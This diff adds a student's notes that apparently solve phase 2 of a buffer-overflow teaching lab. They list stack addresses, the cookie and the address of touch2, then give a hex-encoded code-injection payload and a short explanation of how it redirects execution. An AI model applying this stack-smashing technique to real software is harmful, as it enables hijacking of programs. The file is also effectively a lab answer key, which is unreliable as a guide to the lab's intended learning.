@@ -1,0 +1,17 @@
+0x55640088 is rsp after calling getbuf
+0x556400b0 is rsp before allocating space for gbuf
+
+cookie is in
+0x604504: 0x3661a994
+
+touch2 is in
+0x401880
+
+exploit:
+
+48 c7 c7 94 a9 61 36 48 c7 04 24 80 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 18 40 00 00 00 00 00 88 00 64 55 00 00 00 00
+
+first we return to our injected code, in that code we just
+1. pass arg by moving cookie to %rdi
+2. put touch2's address to the address to which rsp is pointing to so when we return we jump to touch2
+2. return
